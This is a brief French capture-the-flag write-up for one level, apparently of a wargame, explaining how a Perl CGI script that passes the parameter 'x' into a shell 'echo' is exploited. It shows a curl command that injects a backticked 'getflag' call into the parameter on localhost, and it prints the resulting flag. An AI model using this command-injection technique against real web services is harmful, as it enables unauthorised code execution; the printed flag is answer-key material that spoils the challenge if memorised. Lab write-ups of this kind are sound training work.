Dans ce niveau avec ```ls``` on voit un fichier ```level04.pl``` donc un script perl

Quand on ```cat level04.pl``` on voit une fonction qui execute la commande shell ```echo $y 2>&1```

Le param qui est passe est 'x' donc on va ssayer de lui passer ```getlfag```

On utilise curl avec ```curl "http://localhost:4747/level04.pl?x=\`getflag\`"``` et on obtient le flag = ```ne2searoevaevoem4ov4ar8ap```